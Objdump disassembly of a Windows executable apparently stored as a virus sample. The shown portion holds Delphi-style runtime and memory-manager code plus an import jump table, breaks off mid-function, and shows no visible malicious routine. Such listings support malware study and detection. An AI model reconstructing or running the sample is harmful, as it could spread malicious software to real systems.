
malware_samples/virus/a7e91c5f61c76363722d1e31fa302174ea041cab8470b40c8c65cc6524bbd6e0.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	0a 06                	or     (%esi),%al
  401002:	73 74                	jae    0x401078
  401004:	72 69                	jb     0x40106f
  401006:	6e                   	outsb  %ds:(%esi),(%dx)
  401007:	67 00 00             	add    %al,(%bx,%si)
	...
  401016:	00 00                	add    %al,(%eax)
  401018:	3c 10                	cmp    $0x10,%al
  40101a:	40                   	inc    %eax
  40101b:	00 00                	add    %al,(%eax)
  40101d:	00 00                	add    %al,(%eax)
  40101f:	00 6d 11             	add    %ch,0x11(%ebp)
  401022:	40                   	inc    %eax
  401023:	00 04 00             	add    %al,(%eax,%eax,1)
  401026:	00 00                	add    %al,(%eax)
  401028:	00 00                	add    %al,(%eax)
  40102a:	00 00                	add    %al,(%eax)
  40102c:	6c                   	insb   (%dx),%es:(%edi)
  40102d:	2a 40 00             	sub    0x0(%eax),%al
  401030:	54                   	push   %esp
  401031:	29 40 00             	sub    %eax,0x0(%eax)
  401034:	7c 29                	jl     0x40105f
  401036:	40                   	inc    %eax
  401037:	00 c0                	add    %al,%al
  401039:	29 40 00             	sub    %eax,0x0(%eax)
  40103c:	11 00                	adc    %eax,(%eax)
  40103e:	0b 00                	or     (%eax),%eax
  401040:	cc                   	int3
  401041:	29 40 00             	sub    %eax,0x0(%eax)
  401044:	04 46                	add    $0x46,%al
  401046:	72 65                	jb     0x4010ad
  401048:	65 13 00             	adc    %gs:(%eax),%eax
  40104b:	d8 29                	fsubrs (%ecx)
  40104d:	40                   	inc    %eax
  40104e:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  401051:	6e                   	outsb  %ds:(%esi),(%dx)
  401052:	69 74 49 6e 73 74 61 	imul   $0x6e617473,0x6e(%ecx,%ecx,2),%esi
  401059:	6e 
  40105a:	63 65 16             	arpl   %esp,0x16(%ebp)
  40105d:	00 f4                	add    %dh,%ah
  40105f:	29 40 00             	sub    %eax,0x0(%eax)
  401062:	0f 43 6c 65 61       	cmovae 0x61(%ebp,%eiz,2),%ebp
  401067:	6e                   	outsb  %ds:(%esi),(%dx)
  401068:	75 70                	jne    0x4010da
  40106a:	49                   	dec    %ecx
  40106b:	6e                   	outsb  %ds:(%esi),(%dx)
  40106c:	73 74                	jae    0x4010e2
  40106e:	61                   	popa
  40106f:	6e                   	outsb  %ds:(%esi),(%dx)
  401070:	63 65 10             	arpl   %esp,0x10(%ebp)
  401073:	00 10                	add    %dl,(%eax)
  401075:	29 40 00             	sub    %eax,0x0(%eax)
  401078:	09 43 6c             	or     %eax,0x6c(%ebx)
  40107b:	61                   	popa
  40107c:	73 73                	jae    0x4010f1
  40107e:	54                   	push   %esp
  40107f:	79 70                	jns    0x4010f1
  401081:	65 10 00             	adc    %al,%gs:(%eax)
  401084:	14 29                	adc    $0x29,%al
  401086:	40                   	inc    %eax
  401087:	00 09                	add    %cl,(%ecx)
  401089:	43                   	inc    %ebx
  40108a:	6c                   	insb   (%dx),%es:(%edi)
  40108b:	61                   	popa
  40108c:	73 73                	jae    0x401101
  40108e:	4e                   	dec    %esi
  40108f:	61                   	popa
  401090:	6d                   	insl   (%dx),%es:(%edi)
  401091:	65 12 00             	adc    %gs:(%eax),%al
  401094:	28 29                	sub    %ch,(%ecx)
  401096:	40                   	inc    %eax
  401097:	00 0b                	add    %cl,(%ebx)
  401099:	43                   	inc    %ebx
  40109a:	6c                   	insb   (%dx),%es:(%edi)
  40109b:	61                   	popa
  40109c:	73 73                	jae    0x401111
  40109e:	4e                   	dec    %esi
  40109f:	61                   	popa
  4010a0:	6d                   	insl   (%dx),%es:(%edi)
  4010a1:	65 49                	gs dec %ecx
  4010a3:	73 12                	jae    0x4010b7
  4010a5:	00 50 29             	add    %dl,0x29(%eax)
  4010a8:	40                   	inc    %eax
  4010a9:	00 0b                	add    %cl,(%ebx)
  4010ab:	43                   	inc    %ebx
  4010ac:	6c                   	insb   (%dx),%es:(%edi)
  4010ad:	61                   	popa
  4010ae:	73 73                	jae    0x401123
  4010b0:	50                   	push   %eax
  4010b1:	61                   	popa
  4010b2:	72 65                	jb     0x401119
  4010b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4010b5:	74 10                	je     0x4010c7
  4010b7:	00 68 2a             	add    %ch,0x2a(%eax)
  4010ba:	40                   	inc    %eax
  4010bb:	00 09                	add    %cl,(%ecx)
  4010bd:	43                   	inc    %ebx
  4010be:	6c                   	insb   (%dx),%es:(%edi)
  4010bf:	61                   	popa
  4010c0:	73 73                	jae    0x401135
  4010c2:	49                   	dec    %ecx
  4010c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4010c4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4010c6:	13 00                	adc    (%eax),%eax
  4010c8:	a0 29 40 00 0c       	mov    0xc004029,%al
  4010cd:	49                   	dec    %ecx
  4010ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4010cf:	73 74                	jae    0x401145
  4010d1:	61                   	popa
  4010d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4010d3:	63 65 53             	arpl   %esp,0x53(%ebp)
  4010d6:	69 7a 65 13 00 58 2a 	imul   $0x2a580013,0x65(%edx),%edi
  4010dd:	40                   	inc    %eax
  4010de:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  4010e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4010e2:	68 65 72 69 74       	push   $0x74697265
  4010e7:	73 46                	jae    0x40112f
  4010e9:	72 6f                	jb     0x40115a
  4010eb:	6d                   	insl   (%dx),%es:(%edi)
  4010ec:	0f 00                	(bad)
  4010ee:	70 2a                	jo     0x40111a
  4010f0:	40                   	inc    %eax
  4010f1:	00 08                	add    %cl,(%eax)
  4010f3:	44                   	inc    %esp
  4010f4:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
  4010fb:	14 00                	adc    $0x0,%al
  4010fd:	98                   	cwtl
  4010fe:	2a 40 00             	sub    0x0(%eax),%al
  401101:	0d 4d 65 74 68       	or     $0x6874654d,%eax
  401106:	6f                   	outsl  %ds:(%esi),(%dx)
  401107:	64 41                	fs inc %ecx
  401109:	64 64 72 65          	fs fs jb 0x401172
  40110d:	73 73                	jae    0x401182
  40110f:	11 00                	adc    %eax,(%eax)
  401111:	e4 2a                	in     $0x2a,%al
  401113:	40                   	inc    %eax
  401114:	00 0a                	add    %cl,(%edx)
  401116:	4d                   	dec    %ebp
  401117:	65 74 68             	gs je  0x401182
  40111a:	6f                   	outsl  %ds:(%esi),(%dx)
  40111b:	64 4e                	fs dec %esi
  40111d:	61                   	popa
  40111e:	6d                   	insl   (%dx),%es:(%edi)
  40111f:	65 13 00             	adc    %gs:(%eax),%eax
  401122:	20 2b                	and    %ch,(%ebx)
  401124:	40                   	inc    %eax
  401125:	00 0c 46             	add    %cl,(%esi,%eax,2)
  401128:	69 65 6c 64 41 64 64 	imul   $0x64644164,0x6c(%ebp),%esp
  40112f:	72 65                	jb     0x401196
  401131:	73 73                	jae    0x4011a6
  401133:	15 00 6c 2a 40       	adc    $0x402a6c00,%eax
  401138:	00 0e                	add    %cl,(%esi)
  40113a:	44                   	inc    %esp
  40113b:	65 66 61             	gs popaw
  40113e:	75 6c                	jne    0x4011ac
  401140:	74 48                	je     0x40118a
  401142:	61                   	popa
  401143:	6e                   	outsb  %ds:(%esi),(%dx)
  401144:	64 6c                	fs insb (%dx),%es:(%edi)
  401146:	65 72 12             	gs jb  0x40115b
  401149:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40114d:	00 0b                	add    %cl,(%ebx)
  40114f:	4e                   	dec    %esi
  401150:	65 77 49             	gs ja  0x40119c
  401153:	6e                   	outsb  %ds:(%esi),(%dx)
  401154:	73 74                	jae    0x4011ca
  401156:	61                   	popa
  401157:	6e                   	outsb  %ds:(%esi),(%dx)
  401158:	63 65 13             	arpl   %esp,0x13(%ebp)
  40115b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40115f:	00 0c 46             	add    %cl,(%esi,%eax,2)
  401162:	72 65                	jb     0x4011c9
  401164:	65 49                	gs dec %ecx
  401166:	6e                   	outsb  %ds:(%esi),(%dx)
  401167:	73 74                	jae    0x4011dd
  401169:	61                   	popa
  40116a:	6e                   	outsb  %ds:(%esi),(%dx)
  40116b:	63 65 07             	arpl   %esp,0x7(%ebp)
  40116e:	54                   	push   %esp
  40116f:	4f                   	dec    %edi
  401170:	62 6a 65             	bound  %ebp,0x65(%edx)
  401173:	63 74 8d 40          	arpl   %esi,0x40(%ebp,%ecx,4)
  401177:	00 07                	add    %al,(%edi)
  401179:	07                   	pop    %es
  40117a:	54                   	push   %esp
  40117b:	4f                   	dec    %edi
  40117c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40117f:	63 74 3c 10          	arpl   %esi,0x10(%esp,%edi,1)
  401183:	40                   	inc    %eax
  401184:	00 00                	add    %al,(%eax)
  401186:	00 00                	add    %al,(%eax)
  401188:	00 00                	add    %al,(%eax)
  40118a:	00 06                	add    %al,(%esi)
  40118c:	53                   	push   %ebx
  40118d:	79 73                	jns    0x401202
  40118f:	74 65                	je     0x4011f6
  401191:	6d                   	insl   (%dx),%es:(%edi)
  401192:	00 00                	add    %al,(%eax)
  401194:	c3                   	ret
  401195:	8d 40 00             	lea    0x0(%eax),%eax
  401198:	ff 25 14 c1 41 00    	jmp    *0x41c114
  40119e:	8b c0                	mov    %eax,%eax
  4011a0:	ff 25 10 c1 41 00    	jmp    *0x41c110
  4011a6:	8b c0                	mov    %eax,%eax
  4011a8:	ff 25 0c c1 41 00    	jmp    *0x41c10c
  4011ae:	8b c0                	mov    %eax,%eax
  4011b0:	ff 25 08 c1 41 00    	jmp    *0x41c108
  4011b6:	8b c0                	mov    %eax,%eax
  4011b8:	ff 25 04 c1 41 00    	jmp    *0x41c104
  4011be:	8b c0                	mov    %eax,%eax
  4011c0:	ff 25 00 c1 41 00    	jmp    *0x41c100
  4011c6:	8b c0                	mov    %eax,%eax
  4011c8:	ff 25 fc c0 41 00    	jmp    *0x41c0fc
  4011ce:	8b c0                	mov    %eax,%eax
  4011d0:	ff 25 1c c1 41 00    	jmp    *0x41c11c
  4011d6:	8b c0                	mov    %eax,%eax
  4011d8:	ff 25 f8 c0 41 00    	jmp    *0x41c0f8
  4011de:	8b c0                	mov    %eax,%eax
  4011e0:	ff 25 f4 c0 41 00    	jmp    *0x41c0f4
  4011e6:	8b c0                	mov    %eax,%eax
  4011e8:	ff 25 f0 c0 41 00    	jmp    *0x41c0f0
  4011ee:	8b c0                	mov    %eax,%eax
  4011f0:	ff 25 ec c0 41 00    	jmp    *0x41c0ec
  4011f6:	8b c0                	mov    %eax,%eax
  4011f8:	ff 25 e8 c0 41 00    	jmp    *0x41c0e8
  4011fe:	8b c0                	mov    %eax,%eax
  401200:	ff 25 e4 c0 41 00    	jmp    *0x41c0e4
  401206:	8b c0                	mov    %eax,%eax
  401208:	ff 25 e0 c0 41 00    	jmp    *0x41c0e0
  40120e:	8b c0                	mov    %eax,%eax
  401210:	ff 25 dc c0 41 00    	jmp    *0x41c0dc
  401216:	8b c0                	mov    %eax,%eax
  401218:	ff 25 d8 c0 41 00    	jmp    *0x41c0d8
  40121e:	8b c0                	mov    %eax,%eax
  401220:	ff 25 d4 c0 41 00    	jmp    *0x41c0d4
  401226:	8b c0                	mov    %eax,%eax
  401228:	ff 25 d0 c0 41 00    	jmp    *0x41c0d0
  40122e:	8b c0                	mov    %eax,%eax
  401230:	ff 25 cc c0 41 00    	jmp    *0x41c0cc
  401236:	8b c0                	mov    %eax,%eax
  401238:	ff 25 c8 c0 41 00    	jmp    *0x41c0c8
  40123e:	8b c0                	mov    %eax,%eax
  401240:	ff 25 c4 c0 41 00    	jmp    *0x41c0c4
  401246:	8b c0                	mov    %eax,%eax
  401248:	ff 25 c0 c0 41 00    	jmp    *0x41c0c0
  40124e:	8b c0                	mov    %eax,%eax
  401250:	ff 25 34 c1 41 00    	jmp    *0x41c134
  401256:	8b c0                	mov    %eax,%eax
  401258:	ff 25 30 c1 41 00    	jmp    *0x41c130
  40125e:	8b c0                	mov    %eax,%eax
  401260:	ff 25 2c c1 41 00    	jmp    *0x41c12c
  401266:	8b c0                	mov    %eax,%eax
  401268:	ff 25 28 c1 41 00    	jmp    *0x41c128
  40126e:	8b c0                	mov    %eax,%eax
  401270:	ff 25 24 c1 41 00    	jmp    *0x41c124
  401276:	8b c0                	mov    %eax,%eax
  401278:	ff 25 bc c0 41 00    	jmp    *0x41c0bc
  40127e:	8b c0                	mov    %eax,%eax
  401280:	ff 25 b8 c0 41 00    	jmp    *0x41c0b8
  401286:	8b c0                	mov    %eax,%eax
  401288:	ff 25 b4 c0 41 00    	jmp    *0x41c0b4
  40128e:	8b c0                	mov    %eax,%eax
  401290:	ff 25 b0 c0 41 00    	jmp    *0x41c0b0
  401296:	8b c0                	mov    %eax,%eax
  401298:	ff 25 ac c0 41 00    	jmp    *0x41c0ac
  40129e:	8b c0                	mov    %eax,%eax
  4012a0:	ff 25 a8 c0 41 00    	jmp    *0x41c0a8
  4012a6:	8b c0                	mov    %eax,%eax
  4012a8:	ff 25 a4 c0 41 00    	jmp    *0x41c0a4
  4012ae:	8b c0                	mov    %eax,%eax
  4012b0:	ff 25 a0 c0 41 00    	jmp    *0x41c0a0
  4012b6:	8b c0                	mov    %eax,%eax
  4012b8:	53                   	push   %ebx
  4012b9:	56                   	push   %esi
  4012ba:	be 38 c4 40 00       	mov    $0x40c438,%esi
  4012bf:	83 3e 00             	cmpl   $0x0,(%esi)
  4012c2:	75 3a                	jne    0x4012fe
  4012c4:	68 44 06 00 00       	push   $0x644
  4012c9:	6a 00                	push   $0x0
  4012cb:	e8 a8 ff ff ff       	call   0x401278
  4012d0:	8b c8                	mov    %eax,%ecx
  4012d2:	85 c9                	test   %ecx,%ecx
  4012d4:	75 05                	jne    0x4012db
  4012d6:	33 c0                	xor    %eax,%eax
  4012d8:	5e                   	pop    %esi
  4012d9:	5b                   	pop    %ebx
  4012da:	c3                   	ret
  4012db:	a1 34 c4 40 00       	mov    0x40c434,%eax
  4012e0:	89 01                	mov    %eax,(%ecx)
  4012e2:	89 0d 34 c4 40 00    	mov    %ecx,0x40c434
  4012e8:	33 d2                	xor    %edx,%edx
  4012ea:	8b c2                	mov    %edx,%eax
  4012ec:	03 c0                	add    %eax,%eax
  4012ee:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  4012f2:	8b 1e                	mov    (%esi),%ebx
  4012f4:	89 18                	mov    %ebx,(%eax)
  4012f6:	89 06                	mov    %eax,(%esi)
  4012f8:	42                   	inc    %edx
  4012f9:	83 fa 64             	cmp    $0x64,%edx
  4012fc:	75 ec                	jne    0x4012ea
  4012fe:	8b 06                	mov    (%esi),%eax
  401300:	8b 10                	mov    (%eax),%edx
  401302:	89 16                	mov    %edx,(%esi)
  401304:	5e                   	pop    %esi
  401305:	5b                   	pop    %ebx
  401306:	c3                   	ret
  401307:	90                   	nop
  401308:	89 00                	mov    %eax,(%eax)
  40130a:	89 40 04             	mov    %eax,0x4(%eax)
  40130d:	c3                   	ret
  40130e:	8b c0                	mov    %eax,%eax
  401310:	53                   	push   %ebx
  401311:	56                   	push   %esi
  401312:	8b f2                	mov    %edx,%esi
  401314:	8b d8                	mov    %eax,%ebx
  401316:	e8 9d ff ff ff       	call   0x4012b8
  40131b:	85 c0                	test   %eax,%eax
  40131d:	75 05                	jne    0x401324
  40131f:	33 c0                	xor    %eax,%eax
  401321:	5e                   	pop    %esi
  401322:	5b                   	pop    %ebx
  401323:	c3                   	ret
  401324:	8b 16                	mov    (%esi),%edx
  401326:	89 50 08             	mov    %edx,0x8(%eax)
  401329:	8b 56 04             	mov    0x4(%esi),%edx
  40132c:	89 50 0c             	mov    %edx,0xc(%eax)
  40132f:	8b 13                	mov    (%ebx),%edx
  401331:	89 10                	mov    %edx,(%eax)
  401333:	89 58 04             	mov    %ebx,0x4(%eax)
  401336:	89 42 04             	mov    %eax,0x4(%edx)
  401339:	89 03                	mov    %eax,(%ebx)
  40133b:	b0 01                	mov    $0x1,%al
  40133d:	5e                   	pop    %esi
  40133e:	5b                   	pop    %ebx
  40133f:	c3                   	ret
  401340:	8b 50 04             	mov    0x4(%eax),%edx
  401343:	8b 00                	mov    (%eax),%eax
  401345:	89 02                	mov    %eax,(%edx)
  401347:	89 50 04             	mov    %edx,0x4(%eax)
  40134a:	c3                   	ret
  40134b:	90                   	nop
  40134c:	53                   	push   %ebx
  40134d:	56                   	push   %esi
  40134e:	57                   	push   %edi
  40134f:	8b f1                	mov    %ecx,%esi
  401351:	8b f8                	mov    %eax,%edi
  401353:	8b 1f                	mov    (%edi),%ebx
  401355:	8b 02                	mov    (%edx),%eax
  401357:	89 06                	mov    %eax,(%esi)
  401359:	8b 42 04             	mov    0x4(%edx),%eax
  40135c:	89 46 04             	mov    %eax,0x4(%esi)
  40135f:	8b 43 08             	mov    0x8(%ebx),%eax
  401362:	8b d0                	mov    %eax,%edx
  401364:	03 53 0c             	add    0xc(%ebx),%edx
  401367:	3b 16                	cmp    (%esi),%edx
  401369:	75 14                	jne    0x40137f
  40136b:	8b c3                	mov    %ebx,%eax
  40136d:	e8 ce ff ff ff       	call   0x401340
  401372:	8b 43 08             	mov    0x8(%ebx),%eax
  401375:	89 06                	mov    %eax,(%esi)
  401377:	8b 43 0c             	mov    0xc(%ebx),%eax
  40137a:	01 46 04             	add    %eax,0x4(%esi)
  40137d:	eb 16                	jmp    0x401395
  40137f:	8b 16                	mov    (%esi),%edx
  401381:	03 56 04             	add    0x4(%esi),%edx
  401384:	3b c2                	cmp    %edx,%eax
  401386:	75 0d                	jne    0x401395
  401388:	8b c3                	mov    %ebx,%eax
  40138a:	e8 b1 ff ff ff       	call   0x401340
  40138f:	8b 43 0c             	mov    0xc(%ebx),%eax
  401392:	01 46 04             	add    %eax,0x4(%esi)
  401395:	8b 1b                	mov    (%ebx),%ebx
  401397:	3b fb                	cmp    %ebx,%edi
  401399:	75 c4                	jne    0x40135f
  40139b:	8b d6                	mov    %esi,%edx
  40139d:	8b c7                	mov    %edi,%eax
  40139f:	e8 6c ff ff ff       	call   0x401310
  4013a4:	84 c0                	test   %al,%al
  4013a6:	75 04                	jne    0x4013ac
  4013a8:	33 c0                	xor    %eax,%eax
  4013aa:	89 06                	mov    %eax,(%esi)
  4013ac:	5f                   	pop    %edi
  4013ad:	5e                   	pop    %esi
  4013ae:	5b                   	pop    %ebx
  4013af:	c3                   	ret
  4013b0:	53                   	push   %ebx
  4013b1:	56                   	push   %esi
  4013b2:	57                   	push   %edi
  4013b3:	55                   	push   %ebp
  4013b4:	83 c4 f8             	add    $0xfffffff8,%esp
  4013b7:	8b d8                	mov    %eax,%ebx
  4013b9:	8b fb                	mov    %ebx,%edi
  4013bb:	8b 32                	mov    (%edx),%esi
  4013bd:	8b 43 08             	mov    0x8(%ebx),%eax
  4013c0:	3b f0                	cmp    %eax,%esi
  4013c2:	72 6c                	jb     0x401430
  4013c4:	8b ce                	mov    %esi,%ecx
  4013c6:	03 4a 04             	add    0x4(%edx),%ecx
  4013c9:	8b e8                	mov    %eax,%ebp
  4013cb:	03 6b 0c             	add    0xc(%ebx),%ebp
  4013ce:	3b cd                	cmp    %ebp,%ecx
  4013d0:	77 5e                	ja     0x401430
  4013d2:	3b f0                	cmp    %eax,%esi
  4013d4:	75 1b                	jne    0x4013f1
  4013d6:	8b 42 04             	mov    0x4(%edx),%eax
  4013d9:	01 43 08             	add    %eax,0x8(%ebx)
  4013dc:	8b 42 04             	mov    0x4(%edx),%eax
  4013df:	29 43 0c             	sub    %eax,0xc(%ebx)
  4013e2:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  4013e6:	75 44                	jne    0x40142c
  4013e8:	8b c3                	mov    %ebx,%eax
  4013ea:	e8 51 ff ff ff       	call   0x401340
  4013ef:	eb 3b                	jmp    0x40142c
  4013f1:	8b 0a                	mov    (%edx),%ecx
  4013f3:	8b 72 04             	mov    0x4(%edx),%esi
  4013f6:	03 ce                	add    %esi,%ecx
  4013f8:	8b f8                	mov    %eax,%edi
  4013fa:	03 7b 0c             	add    0xc(%ebx),%edi
  4013fd:	3b cf                	cmp    %edi,%ecx
  4013ff:	75 05                	jne    0x401406
  401401:	29 73 0c             	sub    %esi,0xc(%ebx)
  401404:	eb 26                	jmp    0x40142c
  401406:	8b 0a                	mov    (%edx),%ecx
  401408:	03 4a 04             	add    0x4(%edx),%ecx
  40140b:	89 0c 24             	mov    %ecx,(%esp)
  40140e:	2b f9                	sub    %ecx,%edi
  401410:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401414:	8b 12                	mov    (%edx),%edx
  401416:	2b d0                	sub    %eax,%edx
  401418:	89 53 0c             	mov    %edx,0xc(%ebx)
  40141b:	8b d4                	mov    %esp,%edx
  40141d:	8b c3                	mov    %ebx,%eax
  40141f:	e8 ec fe ff ff       	call   0x401310
  401424:	84 c0                	test   %al,%al
  401426:	75 04                	jne    0x40142c
  401428:	33 c0                	xor    %eax,%eax
  40142a:	eb 0c                	jmp    0x401438
  40142c:	b0 01                	mov    $0x1,%al
  40142e:	eb 08                	jmp    0x401438
  401430:	8b 1b                	mov    (%ebx),%ebx
  401432:	3b fb                	cmp    %ebx,%edi
  401434:	75 85                	jne    0x4013bb
  401436:	33 c0                	xor    %eax,%eax
  401438:	59                   	pop    %ecx
  401439:	5a                   	pop    %edx
  40143a:	5d                   	pop    %ebp
  40143b:	5f                   	pop    %edi
  40143c:	5e                   	pop    %esi
  40143d:	5b                   	pop    %ebx
  40143e:	c3                   	ret
  40143f:	90                   	nop
  401440:	53                   	push   %ebx
  401441:	56                   	push   %esi
  401442:	57                   	push   %edi
  401443:	8b da                	mov    %edx,%ebx
  401445:	8b f0                	mov    %eax,%esi
  401447:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40144d:	7d 07                	jge    0x401456
  40144f:	be 00 00 10 00       	mov    $0x100000,%esi
  401454:	eb 0c                	jmp    0x401462
  401456:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  40145c:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401462:	89 73 04             	mov    %esi,0x4(%ebx)
  401465:	6a 01                	push   $0x1
  401467:	68 00 20 00 00       	push   $0x2000
  40146c:	56                   	push   %esi
  40146d:	6a 00                	push   $0x0
  40146f:	e8 14 fe ff ff       	call   0x401288
  401474:	8b f8                	mov    %eax,%edi
  401476:	89 3b                	mov    %edi,(%ebx)
  401478:	85 ff                	test   %edi,%edi
  40147a:	74 23                	je     0x40149f
  40147c:	8b d3                	mov    %ebx,%edx
  40147e:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  401483:	e8 88 fe ff ff       	call   0x401310
  401488:	84 c0                	test   %al,%al
  40148a:	75 13                	jne    0x40149f
  40148c:	68 00 80 00 00       	push   $0x8000
  401491:	6a 00                	push   $0x0
  401493:	8b 03                	mov    (%ebx),%eax
  401495:	50                   	push   %eax
  401496:	e8 f5 fd ff ff       	call   0x401290
  40149b:	33 c0                	xor    %eax,%eax
  40149d:	89 03                	mov    %eax,(%ebx)
  40149f:	5f                   	pop    %edi
  4014a0:	5e                   	pop    %esi
  4014a1:	5b                   	pop    %ebx
  4014a2:	c3                   	ret
  4014a3:	90                   	nop
  4014a4:	53                   	push   %ebx
  4014a5:	56                   	push   %esi
  4014a6:	57                   	push   %edi
  4014a7:	55                   	push   %ebp
  4014a8:	8b d9                	mov    %ecx,%ebx
  4014aa:	8b f2                	mov    %edx,%esi
  4014ac:	8b e8                	mov    %eax,%ebp
  4014ae:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  4014b5:	6a 04                	push   $0x4
  4014b7:	68 00 20 00 00       	push   $0x2000
  4014bc:	68 00 00 10 00       	push   $0x100000
  4014c1:	55                   	push   %ebp
  4014c2:	e8 c1 fd ff ff       	call   0x401288
  4014c7:	8b f8                	mov    %eax,%edi
  4014c9:	89 3b                	mov    %edi,(%ebx)
  4014cb:	85 ff                	test   %edi,%edi
  4014cd:	75 1f                	jne    0x4014ee
  4014cf:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4014d5:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4014db:	89 73 04             	mov    %esi,0x4(%ebx)
  4014de:	6a 04                	push   $0x4
  4014e0:	68 00 20 00 00       	push   $0x2000
  4014e5:	56                   	push   %esi
  4014e6:	55                   	push   %ebp
  4014e7:	e8 9c fd ff ff       	call   0x401288
  4014ec:	89 03                	mov    %eax,(%ebx)
  4014ee:	83 3b 00             	cmpl   $0x0,(%ebx)
  4014f1:	74 23                	je     0x401516
  4014f3:	8b d3                	mov    %ebx,%edx
  4014f5:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  4014fa:	e8 11 fe ff ff       	call   0x401310
  4014ff:	84 c0                	test   %al,%al
  401501:	75 13                	jne    0x401516
  401503:	68 00 80 00 00       	push   $0x8000
  401508:	6a 00                	push   $0x0
  40150a:	8b 03                	mov    (%ebx),%eax
  40150c:	50                   	push   %eax
  40150d:	e8 7e fd ff ff       	call   0x401290
  401512:	33 c0                	xor    %eax,%eax
  401514:	89 03                	mov    %eax,(%ebx)
  401516:	5d                   	pop    %ebp
  401517:	5f                   	pop    %edi
  401518:	5e                   	pop    %esi
  401519:	5b                   	pop    %ebx
  40151a:	c3                   	ret
  40151b:	90                   	nop
  40151c:	53                   	push   %ebx
  40151d:	56                   	push   %esi
  40151e:	57                   	push   %edi
  40151f:	55                   	push   %ebp
  401520:	83 c4 f0             	add    $0xfffffff0,%esp
  401523:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401527:	89 14 24             	mov    %edx,(%esp)
  40152a:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401531:	ff 
  401532:	33 ed                	xor    %ebp,%ebp
  401534:	8b f8                	mov    %eax,%edi
  401536:	8b 04 24             	mov    (%esp),%eax
  401539:	03 c7                	add    %edi,%eax
  40153b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40153f:	8b 1d 3c c4 40 00    	mov    0x40c43c,%ebx
  401545:	eb 4b                	jmp    0x401592
  401547:	8b 73 08             	mov    0x8(%ebx),%esi
  40154a:	3b fe                	cmp    %esi,%edi
  40154c:	77 42                	ja     0x401590
  40154e:	8b c6                	mov    %esi,%eax
  401550:	03 43 0c             	add    0xc(%ebx),%eax
  401553:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  401557:	77 37                	ja     0x401590
  401559:	3b 74 24 08          	cmp    0x8(%esp),%esi
  40155d:	73 04                	jae    0x401563
  40155f:	89 74 24 08          	mov    %esi,0x8(%esp)
  401563:	8b c6                	mov    %esi,%eax
  401565:	03 43 0c             	add    0xc(%ebx),%eax
  401568:	3b e8                	cmp    %eax,%ebp
  40156a:	73 02                	jae    0x40156e
  40156c:	8b e8                	mov    %eax,%ebp
  40156e:	68 00 80 00 00       	push   $0x8000
  401573:	6a 00                	push   $0x0
  401575:	56                   	push   %esi
  401576:	e8 15 fd ff ff       	call   0x401290
  40157b:	85 c0                	test   %eax,%eax
  40157d:	75 0a                	jne    0x401589
  40157f:	c7 05 18 c4 40 00 01 	movl   $0x1,0x40c418
  401586:	00 00 00 
  401589:	8b c3                	mov    %ebx,%eax
  40158b:	e8 b0 fd ff ff       	call   0x401340
  401590:	8b 1b                	mov    (%ebx),%ebx
  401592:	81 fb 3c c4 40 00    	cmp    $0x40c43c,%ebx
  401598:	75 ad                	jne    0x401547
  40159a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40159e:	33 d2                	xor    %edx,%edx
  4015a0:	89 10                	mov    %edx,(%eax)
  4015a2:	85 ed                	test   %ebp,%ebp
  4015a4:	74 15                	je     0x4015bb
  4015a6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015aa:	8b 54 24 08          	mov    0x8(%esp),%edx
  4015ae:	89 10                	mov    %edx,(%eax)
  4015b0:	2b 6c 24 08          	sub    0x8(%esp),%ebp
  4015b4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015b8:	89 68 04             	mov    %ebp,0x4(%eax)
  4015bb:	83 c4 10             	add    $0x10,%esp
  4015be:	5d                   	pop    %ebp
  4015bf:	5f                   	pop    %edi
  4015c0:	5e                   	pop    %esi
  4015c1:	5b                   	pop    %ebx
  4015c2:	c3                   	ret
  4015c3:	90                   	nop
  4015c4:	53                   	push   %ebx
  4015c5:	56                   	push   %esi
  4015c6:	57                   	push   %edi
  4015c7:	55                   	push   %ebp
  4015c8:	83 c4 f4             	add    $0xfffffff4,%esp
  4015cb:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4015cf:	89 14 24             	mov    %edx,(%esp)
  4015d2:	8b d0                	mov    %eax,%edx
  4015d4:	8b ea                	mov    %edx,%ebp
  4015d6:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  4015dc:	03 14 24             	add    (%esp),%edx
  4015df:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  4015e5:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4015eb:	89 54 24 08          	mov    %edx,0x8(%esp)
  4015ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015f3:	89 28                	mov    %ebp,(%eax)
  4015f5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4015f9:	2b c5                	sub    %ebp,%eax
  4015fb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015ff:	89 42 04             	mov    %eax,0x4(%edx)
  401602:	8b 35 3c c4 40 00    	mov    0x40c43c,%esi
